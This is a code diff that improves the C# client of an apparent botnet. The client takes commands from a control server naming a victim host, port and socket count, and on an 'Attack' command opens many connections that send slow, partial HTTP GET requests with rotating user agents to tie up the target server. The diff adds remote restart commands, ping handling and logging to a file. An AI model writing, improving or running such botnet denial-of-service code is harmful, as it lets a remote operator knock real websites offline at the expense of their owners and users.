@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
 using System.Drawing;
+using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Security;
@@ -19,11 +20,14 @@ namespace BotnetClient
     {
         // Client Variables
         Socket socket;
+        Thread clientThread;
         static string HostOrIP = ""; // Victim's IP or hostname
         static int Port = 80; // Victim's port
         static bool UseSsl = false; // Will we use SSL when attacking?
+        static bool restart = false;
         static int Delay = 15000; // Delay between keep alive data
         static int SockCount = 8; // How many connections to make?
+        // Other Variables
         static Random Rand = new Random(); // Random number generator
         static string[] UserAgents = // User agent list
         {
@@ -67,7 +71,7 @@ namespace BotnetClient
             log("Starting client thread...");
             this.StyleManager = metroStyleManager1;
             connectionLogListView.Columns[0].Width = connectionLogListView.Width;
-            Thread clientThread = new Thread(() => clientSocketThread());
+            clientThread = new Thread(() => clientSocketThread());
             clientThread.Start();
         }
 
@@ -79,7 +83,6 @@ namespace BotnetClient
             Boolean run = true;
             Boolean stayConnected = true;
             int responceCounter = 1;
-            int updateCounter = 1;
             while (run)
             {
                 try
@@ -123,49 +126,71 @@ namespace BotnetClient
                                 // Print update message in raw form (un-parsed)
                                 if (message.Contains("["))
                                 {
-                                    log("Update " + updateCounter + ": " + message);
+                                    if (message.Contains("ping!"))
+                                    {
+                                        message = message.Replace("ping!", "");
+                                    }
+                                    log("Update: " + message);
                                     string[] arr1 = message.Split(',').Select(s => s.Trim().Substring(1, s.Length - 2)).ToArray();
                                     foreach (string item in arr1)
                                     {
-                                        if (item.Contains("IP:"))
+                                        try
                                         {
-                                            HostOrIP = item.Substring(item.IndexOf(":") + 1);
-                                        }
-                                        else if (item.Contains("Port:"))
-                                        {
-                                            Port = int.Parse(item.Substring(item.IndexOf(":") + 1));
-                                        }
-                                        else if (item.Contains("Delay:"))
-                                        {
-                                            Delay = int.Parse(item.Substring(item.IndexOf(":") + 1));
-                                        }
-                                        else if (item.Contains("Sockets:"))
-                                        {
-                                            SockCount = int.Parse(item.Substring(item.IndexOf(":") + 1));
-                                        }
-                                        else if (item.Contains("UseSSL:"))
-                                        {
-                                            UseSsl = Boolean.Parse(item.Substring(item.IndexOf(":") + 1));
-                                        }
-                                        else if (item.Contains("Attack:"))
-                                        {
-                                            attacking = Boolean.Parse(item.Substring(item.IndexOf(":") + 1));
-                                            if (attacking)
+                                            if (item.Contains("IP:"))
                                             {
-                                                log("Starting attack...");
-                                                for (int i = 0; SockCount > i; i++)
-                                                {// Create sockets for attack
-                                                    try { InitClient(new TcpClient()); } catch { }
+                                                HostOrIP = item.Substring(item.IndexOf(":") + 1);
+                                            }
+                                            else if (item.Contains("Port:"))
+                                            {
+                                                Port = int.Parse(item.Substring(item.IndexOf(":") + 1));
+                                            }
+                                            else if (item.Contains("Delay:"))
+                                            {
+                                                Delay = int.Parse(item.Substring(item.IndexOf(":") + 1));
+                                            }
+                                            else if (item.Contains("Sockets:"))
+                                            {
+                                                SockCount = int.Parse(item.Substring(item.IndexOf(":") + 1));
+                                            }
+                                            else if (item.Contains("UseSSL:"))
+                                            {
+                                                UseSsl = Boolean.Parse(item.Substring(item.IndexOf(":") + 1));
+                                            }
+                                            else if (item.Contains("Attack:"))
+                                            {
+                                                attacking = Boolean.Parse(item.Substring(item.IndexOf(":") + 1));
+                                                if (attacking)
+                                                {
+                                                    log("Starting attack...");
+                                                    for (int i = 0; SockCount > i; i++)
+                                                    {// Create sockets for attack
+                                                        try { InitClient(new TcpClient()); } catch { }
+                                                    }
                                                 }
                                             }
+                                            else if (item.Contains("Restart"))
+                                            {
+                                                restart = Boolean.Parse(item.Substring(item.IndexOf(":") + 1));
+                                                if (restart)
+                                                {
+                                                    Application.Restart();
+                                                    Environment.Exit(0);
+                                                }
+                                            }
+                                        } catch (Exception error)
+                                        {
+                                            log("Error parsing update... " + error.ToString());
                                         }
                                     }
+                                }
+                                else if (message.Contains("ping!"))
+                                {
+                                    log("ping from host recieved...");
                                 } else
                                 {
                                     stayConnected = false;
                                 }
                                 // Increase updateCounter & sleep thread to improve performance
-                                updateCounter++;
                                 Thread.Sleep(1000);
                             } catch (Exception e)
                             {
@@ -204,6 +229,12 @@ namespace BotnetClient
                 catch (Exception e)
                 {
                     log(e.ToString());
+                    if (restart)
+                    {
+                        log("Restarting...");
+                        Application.Restart();
+                        Environment.Exit(0);
+                    }
                 }
             }
         }
@@ -240,6 +271,13 @@ namespace BotnetClient
                     // ughhhhhhhhhhhhh something broke
                     Console.WriteLine("HEY SILLY, THIS IS PREVENTING THE LOG FROM WORKING: " + e.ToString());
                 }
+                try
+                {
+                    File.AppendAllText("log.txt", logMessage + Environment.NewLine);
+                } catch (Exception e)
+                {
+                    log(e.ToString());
+                }
             }
         }
 
@@ -250,10 +288,28 @@ namespace BotnetClient
         /// <param name="e"></param>
         private void MainPanel_FormClosing(object sender, FormClosingEventArgs e)
         {
-            socket.Shutdown(SocketShutdown.Both);
-            socket.Close();
+            try {
+                socket.Shutdown(SocketShutdown.Both);
+            } catch (Exception er) { }
+            try
+            {
+                socket.Close();
+            }
+            catch (Exception er) { }
+            try
+            {
+                clientThread.Abort();
+            }
+            catch (Exception er) { }
         }
 
+
+
+
+
+
+
+        // Attack Methods (these need work/tweaking)
         public void InitClient(TcpClient c)
         {
             byte[] GET = Encoding.UTF8.GetBytes($"GET /?{Rand.Next(2000)} HTTP/1.1\r\n"); // GET request to random nonexistent location
@@ -298,6 +354,7 @@ namespace BotnetClient
 
                         log($"Initiating socket ({c.Client.LocalEndPoint})");
                         NetworkStream s = c.GetStream();
+                        int packetSize = 32;
                         s.Write(GET, 0, GET.Length);
                         s.Write(UserAgent, 0, UserAgent.Length);
                         s.Write(AcceptLanguage, 0, AcceptLanguage.Length);
